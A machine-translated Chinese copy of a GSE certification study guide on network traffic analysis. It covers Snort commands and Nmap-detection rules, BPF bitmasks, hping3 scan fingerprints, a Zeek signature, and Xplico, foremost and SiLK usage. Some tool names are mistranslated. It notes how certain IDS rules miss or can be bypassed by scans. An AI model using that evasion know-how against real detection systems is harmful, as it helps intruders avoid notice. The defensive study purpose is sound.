<html>
<head>
<title>Study Guide For The GSE (GIAC Security Expert): Part 2</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">GIAC安全专家学习指南:第二部分</h1>
<blockquote>原文：<a href="https://medium.datadriveninvestor.com/study-guide-for-the-gse-giac-security-expert-part-2-d7b30ddd5845?source=collection_archive---------3-----------------------#2020-07-19">https://medium.datadriveninvestor.com/study-guide-for-the-gse-giac-security-expert-part-2-d7b30ddd5845?source=collection_archive---------3-----------------------#2020-07-19</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="3db6" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">学习网络安全取证分析以及黑客技术。本指南适用于学习GIAC安全专家认证。</h2></div><p id="3946" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">欢迎来到GIAC安全专家(<a class="ae le" href="https://www.giac.org/certification/security-expert-gse" rel="noopener ugc nofollow" target="_blank"> GSE </a>)认证之旅三部分系列的第二部分。如果你正在寻找<a class="ae le" href="https://medium.com/@dw.chow/study-guide-for-the-gse-giac-security-expert-part-1-da6ca4e4da7a" rel="noopener">第一部分</a>或者希望了解更多关于我们如何设置谷歌云计算VPS和Colab Jupyter笔记本的信息，请使用<a class="ae le" href="https://medium.com/@dw.chow/study-guide-for-the-gse-giac-security-expert-part-1-da6ca4e4da7a" rel="noopener">这个链接</a>。在本指南中，我们将关注一些工具和用例，这些工具和用例并不总是被辩护分析师使用，因为它们不在渗透测试项目中。</p><p id="c64b" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">在GSE中，您将接受GCIH基础测试，其中包括基本的工具使用。你不必掌握每一个工具，但是你应该能够以它们的基本形式运行它们，并且能够识别它们留下的工件。根据GSE官方文件<a class="ae le" href="https://www.giac.org/pdfs/kali-tools.pdf" rel="noopener ugc nofollow" target="_blank">将使用Kali 2018.1 </a>。当你准备练习环境时，记住这一点非常重要，因为从2018年到今天的2020年形象的滚动发布有巨大的变化。不同的工具版本和位置差异很大。请确保您仅在<a class="ae le" href="http://old.kali.org/kali-images/kali-2018.1/" rel="noopener ugc nofollow" target="_blank"> Kali 2018.1映像</a>的环境中模拟、下载和使用工具。</p><p id="52e9" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated"><a class="ae le" href="https://dwchow.medium.com/study-guide-for-the-gse-giac-security-expert-part-3-52d6798b45f0" rel="noopener"> <strong class="kk iu">第三部分</strong></a>【2022年7月16日更新】关于考试的实验室部分和我的成绩的提示</p><h2 id="88b3" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">有效分析方法</h2><p id="b14b" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">本指南无法全面涵盖ATT<a class="ae le" href="https://attack.mitre.org/" rel="noopener ugc nofollow" target="_blank">CK&amp;MITRE</a>框架中的单一TTP路径。然而，我将涵盖一些容易难倒分析师的常见领域，以及如何通过使用GSEC、GCIA或GCIH材料中不总是涵盖的一些选项或功能来最大限度地提高您的考试时间效率。在实验室或资格考试中，最好的办法是保持冷静，思考完成任务的最佳自动化工具。您亲自参与的任务或练习可能包括指纹识别、规则创建、常见攻击、缓冲区溢出或枚举。</p><p id="5d2c" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">不要犯这样的错误，立即去找你最喜欢的或者肌肉键盘记忆工具。例如，你可能会得到一份PCAP的文件，并被告知要对所发生的一切写一份报告。一些分析师陷入默认的学生模式，并打开tcpdump或wireshark，这并不总是最好的选择。还有哪些工具可用？至少你有Kali 2018.1GSE版本的默认设置。在实验室或限定器中，您*可以*使用Snort或Bro(现在称为Zeek ),它们可以帮助您根据预期使用或获得的虚拟机进行自动指纹识别和初始分析。我还将为您提供一些脚本和一行程序，当这些工具在您的实验室或资格考试练习中需要帮助时，它们可以作为替代。让我们开始吧。</p><h2 id="901d" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">流量模式指纹</h2><p id="99c9" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">你一定会得到PCAP的，日志，和现场交通处理。了解您的GSEC、GCIA和GCIH的目标；你可以相信PCAP是你考试和实验室里的一个简单的主食。让我们假设你首先得到一个pcap或在线实时流量。让我们考虑一些工具来分析这种类型的文件，以提示您从哪里开始并确定一些优势:</p><ul class=""><li id="72be" class="md me it kk b kl km ko kp kr mf kv mg kz mh ld mi mj mk ml bi translated">Snort:快速识别pcaps和实时流量中的恶意数据包/负载</li><li id="ef23" class="md me it kk b kl mm ko mn kr mo kv mp kz mq ld mi mj mk ml bi translated">Bro (Zeek):识别数据包流、有效负载和实时流量的违规上下文</li><li id="1534" class="md me it kk b kl mm ko mn kr mo kv mp kz mq ld mi mj mk ml bi translated">Xplico:用于PCAP和实时流量的多文件和流解析器(在CLI中使用)</li><li id="855c" class="md me it kk b kl mm ko mn kr mo kv mp kz mq ld mi mj mk ml bi translated">最重要的:可以识别文件和提取PCAP流</li><li id="b9e9" class="md me it kk b kl mm ko mn kr mo kv mp kz mq ld mi mj mk ml bi translated">Silk Suite:内置的RW工具可以将Pcaps转换成流并分析字节模式</li><li id="086b" class="md me it kk b kl mm ko mn kr mo kv mp kz mq ld mi mj mk ml bi translated">Wireshark:直观地查看数据包和流的层次结构和时间线，并可以导出一些SMB/CIFS和HTTP目标文件</li><li id="9e96" class="md me it kk b kl mm ko mn kr mo kv mp kz mq ld mi mj mk ml bi translated">Tshark:功能相同，但在CLI中，可以快速导出为CSV或其他格式，供其他工具接收</li></ul><p id="e87d" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated"><em class="mr">多任务注意:</em>我喜欢做的事情之一就是利用GNOME工作区。在您的虚拟机中，您可以使用“CRTL+向上或向下移动箭头”在默认的1和2工作区之间移动。这样，您可以通过分析类型和功能来组织不同的终端窗口。</p><h2 id="1700" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated"><strong class="ak">放风</strong></h2><p id="aae5" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">假设它可能安装在您使用的虚拟机上；您肯定可以利用内置的社区规则和预处理器来帮助更容易地缩小您正在寻找的内容。</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="bd1a" class="lf lg it mx b gy nb nc l nd ne">#Output 'fast' alert to console from interface live traffic and output to plain txt log<br/>snort -A console -i &lt;iface&gt; -c /path/to/snort.conf -K ascii -l /path/to/log/foo<br/><br/><br/>#Output 'full' alert and debug to console from pcap, do not log<br/>snort -A cmg -r /path/to/pcap -c /path/to/snort.conf<br/><br/><br/>#Default snort package path locations<br/>/etc/snort.conf<br/>/var/log/snort<br/><br/><br/>#Finding files to use<br/>find -name / -type f "snort.conf"<br/>which snort</span></pre><p id="beff" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">出于演示目的，我只使用默认的社区规则和snort.conf。如果出于任何原因，您的snort.conf损坏或无法在运行时工作，这里是我在Kali 2018.1映像上使用的一个，您可以在这里获取<a class="ae le" href="https://drive.google.com/drive/folders/1J1voCpgEps7gcDuKjCDcWt7BB5lWyDR2?usp=sharing" rel="noopener ugc nofollow" target="_blank"/>。</p><p id="96b6" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated"><em class="mr">对于Windows 10用户:</em>无论出于什么原因，如果你希望使用Windows来做你的分析，我有一个调整库、配置和规则预设置的工作集，你可以使用我提供的安装程序，然后从它们的默认位置复制/粘贴和覆盖现有的目录。这在2020年3月生效，因此所有VRT社区规则和ET社区规则都是在那个时候制定的。你可以从我的Google Drive <a class="ae le" href="https://drive.google.com/drive/folders/1SCFYXgNir03DB-FA9R4o8QEBW-qXhuKI?usp=sharing" rel="noopener ugc nofollow" target="_blank">这里</a>获取它们。</p><p id="9551" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">我将以服务枚举参数为例运行Nmap，看看会出现什么情况:</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi nf"><img src="../Images/333bee3d4da9f40913714476b564655a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9UalmDpZMFYxJLZPYtcMGA.png"/></div></div></figure><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi nn"><img src="../Images/9c107a0d6294dcc1824e3dea45ec395a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Q7YFqlM7oxFGag-zUk6aFQ.png"/></div></div></figure><p id="ad11" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">如您所见,“nmap -sV <target>”交换机的标准模式启动ping扫描，然后是其默认端口集。要在nmap扫描中查看哪些端口由<a class="ae le" href="https://nmap.org/book/nmap-services.html" rel="noopener ugc nofollow" target="_blank">默认</a>运行，您可以在/etc/services下和windows c:\ windows \ system32 \ drivers \ etc \ services中找到它们。</target></p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi no"><img src="../Images/a232a18706525fa4eddff5c76dca166d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JPl20306fLSWw1_VT6ODCw.png"/></div></div></figure><p id="0a5d" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">上面，我们在“cmg”模式下重新运行snort alert，这是一种仅控制台的完全警报模式，它提供了有关触发的有效负载的更多详细信息，就像您在tcpdump上做了更多详细工作一样。如果您需要引用一个特定的有效负载来进行进一步的分析，而又不丢弃/var/log/snort中的日志文件，这将非常有用。</p><h2 id="9e57" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated"><strong class="ak"> Snort规则注意事项</strong></h2><p id="632e" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">snort规则没有错；然而，就像任何分析过程一样。你不能完全依赖自动化的单一解决方案。我们将展示流量模式中的一些差异，这些差异在没有任何网络堆栈修改的情况下不会触发非常常见的规则。考虑以下两条规则。从技术上讲，它们都应该在frag stealth打开的情况下，在平均nmap服务枚举扫描中触发。</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="18f7" class="lf lg it mx b gy nb nc l nd ne">#alert tcp $EXTERNAL_NET any -&gt; $HOME_NET any (msg:"ET SCAN NMAP -f -sV"; fragbits:!M; dsize:0; flags:S,12; ack:0; window:2048; threshold: type both, track by_dst, count 1, seconds 60; reference:url,doc.emergingthreats.net/2000545; classtype:attempted-recon; sid:2000545; rev:8; metadata:created_at 2010_07_30, updated_at 2010_07_30;)<br/><br/>alert http $HOME_NET any -&gt; any any (msg:"ET SCAN Possible Nmap User-Agent Observed"; flow:to_server,established; content:"|20|Nmap"; http_user_agent; fast_pattern; metadata: former_category SCAN; classtype:web-application-attack; sid:2024364; rev:3; metadata:affected_product Any, attack_target Client_and_Server, deployment Perimeter, signature_severity Informational, created_at 2017_06_08, performance_impact Low, updated_at 2017_06_13;)</span></pre><p id="417f" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">让我们运行它，看看我们能找到什么；我已经在<a class="ae le" href="https://www.pfsense.org/" rel="noopener ugc nofollow" target="_blank"> PFsense </a>中运行了这些规则。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi np"><img src="../Images/ccc319f807d96505da57bd2a6559f55c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5SdBLYpAnNkDO8kxLMeOlA.png"/></div></div></figure><p id="1b59" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">我们看到其中一个被触发，但另一个没有。让我们打开wireshark，进一步研究一下。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi nq"><img src="../Images/def7043e5bc012bb7da38c72c536fe86.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_66_mIa0obr-GZmd3gno4Q.png"/></div></div></figure><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="5c15" class="lf lg it mx b gy nb nc l nd ne">#alert tcp $EXTERNAL_NET any -&gt; $HOME_NET any (msg:"ET SCAN NMAP -f -sV"; fragbits:!M; dsize:0; flags:S,12; ack:0; window:2048; threshold: type both, track by_dst, count 1, seconds 60; reference:url,doc.emergingthreats.net/2000545; classtype:attempted-recon; sid:2000545; rev:8; metadata:created_at 2010_07_30, updated_at 2010_07_30;)</span></pre><p id="da6c" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">当您将2048字节的窗口大小与Kali和/或VMware工作站堆栈中出现的1024字节的窗口大小进行比较时；这是不会触发的。我们还可以将SYN标志视为逗号中值为“12”的要求。让我们进一步探讨这到底意味着什么。</p><h2 id="d79e" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">逐位屏蔽BPF</h2><p id="18a7" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">在Snort <a class="ae le" href="http://manual-snort-org.s3-website-us-east-1.amazonaws.com/node33.html#SECTION00468000000000000000" rel="noopener ugc nofollow" target="_blank">手册</a>中，对于非有效负载选项，您指定标志，然后指定位掩码。逗号分隔符允许您创建十进制或字母标志名称表示的掩码:</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="3caa" class="lf lg it mx b gy nb nc l nd ne">#Format</span><span id="b9bd" class="lf lg it mx b gy nr nc l nd ne">flags:[!|*|+]&lt;FSRPAUCE0&gt;[,&lt;FSRPAUCE&gt;];<br/><br/><br/>#Example<br/><br/>This example checks if just the SYN and the FIN bits are set, ignoring CWR (reserved bit 1) and ECN (reserved bit 2).</span><span id="592a" class="lf lg it mx b gy nr nc l nd ne">alert tcp any any -&gt; any any (flags:SF,CE;)</span></pre><p id="1ac8" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">十进制(12)到二进制转换的值是:“0 0 0 0 1 1 0 0”，我们将使用它来覆盖并检查它的外观。根据文档，common后面的掩码用于忽略这些位。这意味着我们在BPF中说:“tcp[13] &amp; <mask value=""> = <your first="" flag="">”作为掩码条件。让我们覆盖这一点，并进一步检查。</your></mask></p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi ns"><img src="../Images/c80e98b9a7e13a737346077730b8ec57.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SSbMEzfrJ-ybdzo9fcub7g.png"/></div></div></figure><p id="f318" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">因此，根据我们的规则，用(S，12)作为标志选项可能看起来像下面的BPF: (tcp[13] &amp; <a class="ae le" href="https://ascii.cl/conversion.htm" rel="noopener ugc nofollow" target="_blank"> 0x0C </a> = 0x2)。因此，我们希望确保SYN位始终使能(0x2 ),并且希望屏蔽掉(忽略)除Push和Reset标志之外的所有其他值。因此结果是SYN位总是被置位；但是我们也捕获(同步+推送，同步+RST，同步+推送+RST)组合。如果你对按位屏蔽(逻辑AND的)<a class="ae le" href="https://www.checksomebytes.com/blog/bit-masking-with-sticky-notes" rel="noopener ugc nofollow" target="_blank">感到生疏，这个指南</a>对你来说是一个极好的视觉效果。</p><p id="fe4a" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">基于上述wireshark pull，值组合很好，因为仅设置了SYN位，所以我们的非触发器本质上是由操作系统网络堆栈设置的TCP窗口大小，除非内核被重新编译以进行更改，或者在Windows world中注册表被调整。在我们的场景中也不是这样，我们把它归因于一个规则，这个规则可能不是一个好的候选规则或者太具体了。然而，同样糟糕的是我们的第二条规则，它非常依赖于字符串“Nmap”的快速模式匹配这很容易被绕过，或者数据包中的微小变化也可能导致GSE考官为您准备的假阴性。</p><div class="nt nu gp gr nv nw"><a href="https://www.datadriveninvestor.com/2020/06/29/cybersecurity-is-in-meltdown-heres-a-new-idea/" rel="noopener  ugc nofollow" target="_blank"><div class="nx ab fo"><div class="ny ab nz cl cj oa"><h2 class="bd iu gy z fp ob fr fs oc fu fw is bi translated">网络安全正在崩溃，这里有一个新的想法|数据驱动的投资者</h2><div class="od l"><h3 class="bd b gy z fp ob fr fs oc fu fw dk translated">对于许多公司来说，网络安全策略是在安全系统和服务上花费数百万，遵循最佳…</h3></div><div class="oe l"><p class="bd b dl z fp ob fr fs oc fu fw dk translated">www.datadriveninvestor.com</p></div></div><div class="of l"><div class="og l oh oi oj of ok nl nw"/></div></div></a></div><h2 id="d266" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">工具特定的指纹特征</h2><p id="376e" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">在不同的课件中，SANS有时会提供一些脚注。如果你不读它们，你可能会错过细节。我从他们最近的考试中学到的一件事是，他们希望你知道工具如何运行的小细节和模式，以及它们在主机工件和流量模式中的样子。下面，我展示了案例hp3，在这种情况下，攻击者伪造数据包“攻击”或脚本错误运行“hp3<host>-S ”,它只发送syn数据包。我没有遇到过好的Snort特征，因此检查这些特征很重要，这样您就可以快速找出什么是异常:</host></p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi ol"><img src="../Images/8f62e07490df65fa51476a1baa604643.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NAip8deQ1M09xPPFh4USRA.png"/></div></div></figure><p id="858e" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">运行空SYN扫描hp3默认情况下只在TCP端口0上发送。还要注意TCP窗口大小现在被设置为512，尽管在我们之前的工具中我们看到的是1024字节。在<a class="ae le" href="https://linux.die.net/man/8/hping3" rel="noopener ugc nofollow" target="_blank">hp3</a>手册中有趣的事情是，如果没有手动设置，窗口大小默认设置为64字节。根据数据包之间的时间和攻击机器源端口上的单个端口增量，我们还可以判断这是标准扫描还是其他快速连接尝试。在正常的应用重试中；它会有更多的超时，重试通常不会创建新的套接字尝试。它将重复使用相同的端口，而不是递增源端口。</p><h2 id="298d" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">要记住的其他攻击类型</h2><p id="7d1c" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">GCIA有大量经典的网络安全攻击，这些攻击可能会在考试中再次出现。尽管他们很容易被遗忘，但这可能是你幸运或不幸的情况。死亡Ping、泪滴、标准碎片规避或插入都是需要记住的特定于数据包的场景。在实践中，考虑检查pcaps并深入到感兴趣的领域，了解Wireshark对操纵RFC规范之外的数据包的攻击场景的解释能力。</p><p id="7bcf" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">https://wiki.wireshark.org/SampleCaptures<a class="ae le" href="https://wiki.wireshark.org/SampleCaptures" rel="noopener ugc nofollow" target="_blank"/></p><h2 id="6862" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">兄弟(齐克)</h2><p id="3a73" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">Bro也是一个优秀的Snort替代品，因为它是一个基于框架的IDS。这非常类似于Snort和Silk RW工具一起在许多日志输出上的流程。虽然对于检测可扩展性来说，它远不止这些，但是让我们使用我们内置的东西。我将读取一个pcap文件，这是已知的勒索软件Win32/Maze的C2流量。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi om"><img src="../Images/8223ae6398a93bb53ccc62fb766e1992.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sGgwt6f2GY326YI9oQtv_A.png"/></div></div></figure><p id="32ac" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">语法非常简单；你不需要运行broctl，你可以自己运行它。“兄弟-r ”和签名和兄弟脚本将输出到你运行它的文件夹中的日志。如果您希望为IPFIX流创建一个类似于“rwcut”的更整洁的外观，您可以使用工具“bro-cut”。如果没有安装bro-cut，你可以在大多数发行版中安装bro-aux。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi on"><img src="../Images/2c46b3b0700e1de16f7deb0bb3bb4282.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*j5UVP_zgjnXabyP5aKxJIw.png"/></div></div></figure><p id="9e4b" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">使用<a class="ae le" href="https://github.com/corelight/bro-cheatsheets/blob/master/Corelight-Bro-Cheatsheets-2.6.pdf" rel="noopener ugc nofollow" target="_blank">Corelight Bro Logs cheat sheet</a>找到您可能想要首先挖掘的地方，并使用bro-cut仅打印您想要的列。有时只是做一个“ls -lah *”。log”可以为您提供有用的提示，告诉您正在运行哪些协议来识别您的流量模式。如果没有安装bro-cut，您可以根据需要选择标准卡特彼勒管道进行sed、cut和awk操作。</p><h2 id="a67c" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">兄弟剧本</h2><p id="ddcc" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">在考试或实验中，你可能会被要求修改或创建脚本。对于大多数候选人来说，snort应该不是问题。使用Bro，因为它是一个框架，如果你不每天使用它；你可能会有麻烦。以下是一个模板，用于在有效负载特定匹配时发出事件警报。基于内容故障排除，如果您觉得Snort签名不触发有问题，这可能是一个很好的备份:</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="de9e" class="lf lg it mx b gy nb nc l nd ne">signature my-first-sig {<br/>    ip-proto == tcp<br/>    dst-port == 80<br/>    payload /.*root/<br/>    event "Found root!"<br/>}</span><span id="72c6" class="lf lg it mx b gy nr nc l nd ne">event signature_match(state: signature_state, msg: string, data: string)</span></pre><p id="053b" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">如果您有兴趣为文件创建一个PCAP，并且如果您的本地bro配置没有设置，您也可以手动执行“bro -r mypcap file_extraction.bro ”,这类似于其他工具，如tcpxtract、chaosreader、foremost和xplico，我将在接下来的部分中重点介绍其中的一些工具。</p><h2 id="1db7" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">Xplico</h2><p id="cbc4" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">该工具侧重于文件和流元提取。它不是一个完美的工具，GUI也非常慢而且有很多问题。但是，它可以与其他带有自动分析的工作区屏幕配合使用，帮助您以更具视觉吸引力的方式理解数据。如果您已经查看了PCAP，并注意到Wireshark的统计数据或层次结构中有大量协议，这可能是在您使用更多手动工具的同时使用Xplico为您提取文件和IP地理图的好时机。使用起来非常简单，运行作为服务器运行的Xplico，并浏览到虚拟机上的本地端口http:// &lt; localhost &gt; :9876。或者，您可以从命令行"<a class="ae le" href="http://wiki.xplico.org/doku.php?id=console_mode" rel="noopener ugc nofollow" target="_blank">xplico-m pcap/output/files</a>运行它，或者在实时捕获的情况下运行" xplico -m rltm -i eth0 "</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi oo"><img src="../Images/161c0626b2f386688d900024e45b1d0f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MicXzD2C7cqCdA001tJJlg.png"/></div></div></figure><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi op"><img src="../Images/68438d878e73420fdebfc0a515f1d622.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rgtQUDq4wYyqPD_JGa4Pqg.png"/></div></div></figure><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi oq"><img src="../Images/84981e0332daaa80131c81ae60c133ce.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1ncFjCuRBlYGoUilqeq4jw.png"/></div></div></figure><p id="68c9" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">关于捕捉变化的传输和文件的可靠性。这不是我喜欢的工具，但总比不得不记住<a class="ae le" href="https://www.garykessler.net/library/file_sigs.html" rel="noopener ugc nofollow" target="_blank">文件的神奇数字</a>并用手雕刻出来要好(你也应该准备这么做)。</p><h2 id="ed9a" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">最重要的</h2><p id="1401" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">大多数DFIR分析师记得这个工具是从系统映像中雕刻文件的一个老的解决方案。但是它也可以处理有限容量的PCAP雕刻，这取决于类型。我想说，它仍然不如使用Wireshark和导出HTTP和SMB对象强大，但如果您有一些问题或者只想比较Xplico和Wireshark之间的结果，这可能是一个选项。如果您在一个文件夹中有多个pcaps，它也是可脚本化的，这样会更容易一些。我在这里简单地提一下这个工具，如果您的pcaps有限，并且如果您打算更可靠地雕刻SMB、TFTP或HTTP，我建议您考虑Wireshark。除了我发现的二进制文件，它比tcpxtract更可靠。</p><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div class="gh gi or"><img src="../Images/7c8abaa14180b596e693f1ea5bc05e4a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/format:webp/1*5E2HW0KbJ5rXlcN-KHxK4g.png"/></div></figure><p id="adbd" class="pw-post-body-paragraph ki kj it kk b kl km ju kn ko kp jx kq kr ks kt ku kv kw kx ky kz la lb lc ld im bi translated">foremost的语法是“foremost -i <mypcapfile> -T”。又快又直。</mypcapfile></p><h2 id="327c" class="lf lg it bd lh li lj dn lk ll lm dp ln kr lo lp lq kv lr ls lt kz lu lv lw lx bi translated">Silk套件(流量数据/ RW工具)</h2><p id="2f45" class="pw-post-body-paragraph ki kj it kk b kl ly ju kn ko lz jx kq kr ma kt ku kv mb kx ky kz mc lb lc ld im bi translated">流量记录是推断项目的一种快速简单的方法。这不是为了深入分析，它可能会给你一些提示。如果给你一个pcap，使用最自动化的pcap分析工具。如果你只有流量记录。这是你所拥有的。rwstats、rwfilter和rwcut的用法有助于您准确解析您正在寻找的内容，如下所示:</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="3e1f" class="lf lg it mx b gy nb nc l nd ne">#convert pcaps to silk compatible ipfix flows<br/>rwptoflow ./mypcap.pcap --flow-out=./mypcap-flows.rw<br/><br/>#perform stats on the first five records<br/>rwstats ./maze-flows.rw --fields=protocol --count=5<br/><br/>#grab fields you want based on flow data and limit by 10<br/>rwcut ./maze-flows.rw --fields=sIP,dIP,sPort,dPort,protocol,bytes,flag,duration --num-recs=10<br/><br/>#filter based on criteria such as date and pipe it to rwcut printing the first 8 columns<br/>rwfilter ./maze-flows.rw --pass=stdout --end-date=2020/07/08 | rwcut -f1-8</span></pre><figure class="ms mt mu mv gt ng gh gi paragraph-image"><div role="button" tabindex="0" class="nh ni di nj bf nk"><div class="gh gi os"><img src="../Images/c4cb2770ec84908e83bb9b8812e09334.png" 